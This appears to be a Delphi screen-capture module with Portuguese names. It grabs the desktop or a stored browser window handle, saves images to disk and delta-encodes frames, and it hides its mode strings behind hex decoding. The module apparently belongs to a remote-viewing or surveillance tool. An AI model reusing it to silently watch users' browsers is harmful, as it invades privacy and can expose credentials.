unit StreamManager;

interface

uses
Windows,Classes,Graphics, Unit12, jpeg;

procedure GetScreenToBmp(DrawCur:Boolean;StreamName:TMemoryStream);
procedure GetScreenToBmpFake(DrawCur:Boolean;StreamName:TMemoryStream);
procedure CompareStream(MyFirstStream,MySecondStream,MyCompareStream:TMemorystream);
procedure ResumeStream(MyFirstStream,MySecondStream,MyCompareStream:TMemorystream);
procedure GetDesktop(DrawCur:Boolean;StreamName:TMemoryStream);
procedure navegador(texto:hwnd);
procedure caminho(texto:string);
procedure tipo(texto:string);

var
inst:hwnd;
inst1:string;
inst2:integer;
inst3:string;
inst4:string;

implementation


procedure navegador(texto:hwnd);
begin
inst := texto;
end;

procedure caminho(texto:string);
begin
inst1 := texto;
end;

procedure tipo(texto:string);
begin
inst3 := texto;
end;

procedure GetScreenToBmpFake(DrawCur:Boolean;StreamName:TMemoryStream);
var
  MyJpg : TJPEGImage;
  Mybmp:Tbitmap;
  Cursorx, Cursory: integer;
  dc: hdc;
  Mycan: Tcanvas;
  R: TRect;
  DrawPos: TPoint;
  MyCursor: TIcon;
  hld: hwnd;
  Threadld: dword;
  mp: tpoint;
  pIconInfo: TIconInfo;
begin
  Mybmp := Tbitmap.Create;
  Mycan := TCanvas.Create;
  dc := GetWindowDC(0);
  try
    Mycan.Handle := dc;
    R := Rect(0, 0,  GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN));
    Mybmp.Width := R.Right;
    Mybmp.Height := R.Bottom;
    Mybmp.Canvas.CopyRect(R, Mycan, R);
  finally
    releaseDC(0, DC);
  end;
  Mycan.Handle := 0;
  Mybmp.SaveToFile(inst1 + 'bmp01.bmp');
  MyJpg := TJPEGImage.Create;
  with MyJpg do begin
  Assign(Mybmp);
  SaveToFile(inst1 + 'bmp.jpg');
  Mycan.Free;
end; end;


procedure GetDesktop(DrawCur:Boolean;StreamName:TMemoryStream);
var
  Mybmp:Tbitmap;
  Cursorx, Cursory: integer;
  dc: hdc;
  Mycan: Tcanvas;
  R: TRect;
  DrawPos: TPoint;
  MyCursor: TIcon;
  hld: hwnd;
  Threadld: dword;
  mp: tpoint;
  pIconInfo: TIconInfo;
begin
  Mybmp := Tbitmap.Create;
  Mycan := TCanvas.Create;
  dc := GetWindowDC(0);
  try
    Mycan.Handle := dc;
    R := Rect(0, 0,  GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN));
    Mybmp.Width := R.Right;
    Mybmp.Height := R.Bottom;
    Mybmp.Canvas.CopyRect(R, Mycan, R);
  finally
    releaseDC(0, DC);
  end;
  Mycan.Handle := 0;
  Mycan.Free;



  if DrawCur then
  begin
    GetCursorPos(DrawPos);
    MyCursor := TIcon.Create;
    getcursorpos(mp);
    hld := WindowFromPoint(mp);
    Threadld := GetWindowThreadProcessId(hld, nil);
    AttachThreadInput(GetCurrentThreadId, Threadld, True);
    MyCursor.Handle := Getcursor();
    AttachThreadInput(GetCurrentThreadId, threadld, False);
    GetIconInfo(Mycursor.Handle, pIconInfo);
    cursorx := DrawPos.x - round(pIconInfo.xHotspot);
    cursory := DrawPos.y - round(pIconInfo.yHotspot);
    Mybmp.Canvas.Draw(cursorx, cursory, MyCursor);
    DeleteObject(pIconInfo.hbmColor);
    DeleteObject(pIconInfo.hbmMask);
    Mycursor.ReleaseHandle;
    MyCursor.Free;
  end;

  
  
  Mybmp.PixelFormat:=pf8bit;
  Mybmp.SaveToStream(StreamName);
  Mybmp.Free;
end;


procedure GetScreenToBmp(DrawCur:Boolean;StreamName:TMemoryStream);
var
  Mybmp:Tbitmap;
  Cursorx, Cursory: integer;
  dc: hdc;
  Mycan: Tcanvas;
  R: TRect;
  DrawPos: TPoint;
  MyCursor: TIcon;
  hld: hwnd;
  Threadld: dword;
  mp: tpoint;
  pIconInfo: TIconInfo;
  windowHandle: HWND;
  user32DLLHandle: THandle;
  WinName,  WinClass : array[0..80] of Char;
  printWindowAPI: function(sourceHandle: HWND; destinationHandle: HDC;
  nFlags: UINT): BOOL; stdcall;
  label comeco;
begin
  comeco:
  Mybmp := Tbitmap.Create;
  Mycan := TCanvas.Create;
  dc := GetWindowDC(0);
  windowHandle := inst;

  if windowHandle > 0 then
      begin
  DrawCur := False;

  user32DLLHandle := GetModuleHandle(user32) ;
  if user32DLLHandle <> 0 then
  begin
    @printWindowAPI := GetProcAddress(user32DLLHandle, 'PrintWindow') ;
    if @printWindowAPI <> nil then
    begin
      GetWindowRect(windowHandle, r);
      Mybmp.Width := r.Right - r.Left;
      Mybmp.Height := r.Bottom - r.Top;
      Mybmp.Canvas.Lock;
      try
        DrawCur := printWindowAPI(windowHandle, Mybmp.Canvas.Handle, 0) ;
      finally
        Mybmp.Canvas.Unlock;
         Mycan.Handle := dc;
         Mycan.Handle := 0;
         Mycan.Free;
        end;

//   if (Mybmp.Canvas.Pixels[10,10] <> 0) and (Mybmp.Canvas.Pixels[20,20] <> 0) then
// begin
  Mybmp.PixelFormat:=pf8bit;
//  Mybmp.Assign(MyBmp);
  Mybmp.SaveToStream(StreamName);
  Mybmp.Free;
// end;

 {
 else
 begin
 Mybmp.Free;
 goto comeco;
 end;
}

end; end;
end;
end;

procedure CompareStream(MyFirstStream,MySecondStream,MyCompareStream:TMemorystream);
var
  I: Integer;
  P1, P2, P3: ^Char;
begin
  MySecondStream.Clear;
  MyCompareStream.Clear;

  if inst3 = Form12.HexToStr('4E617669') then
  begin
  GetScreenToBmp(true,MySecondStream);
  end;

  if inst3 = Form12.HexToStr('4465736B746F70') then
  begin
  GetDesktop(true,MySecondStream);
  end;

  P1 := MyFirstStream.Memory;
  P2 := MySecondStream.Memory;
  MyCompareStream.SetSize(MyFirstStream.Size);
  P3 := MyCompareStream.Memory;

  for I := 0 to MyFirstStream.Size - 1 do
  begin
    if P1^ = P2^ then
      P3^ := '0'
    else
      P3^ := P2^;
    Inc(P1);
    Inc(P2);
    Inc(P3);
  end;

  MyFirstStream.Clear;
  MyFirstStream.CopyFrom(MySecondStream,0);
  end;

procedure ResumeStream(MyFirstStream,MySecondStream,MyCompareStream:TMemorystream);
var
  I: Integer;
  P1, P2, P3: ^Char;
begin
  P1 := MyFirstStream.Memory;
  MySecondStream.SetSize(MyFirstStream.Size);
  P2 := MySecondStream.Memory;
  P3 := MyCompareStream.Memory;

  for I := 0 to MyFirstStream.Size - 1 do
  begin
    if P3^ = '0' then
      P2^ := p1^
    else
      P2^ := P3^;
    Inc(P1);
    Inc(P2);
    Inc(P3);
  end;

  MyFirstStream.Clear;
  MyFirstStream.CopyFrom(MySecondStream,0);
  MySecondStream.Position:=0;
end;

end.
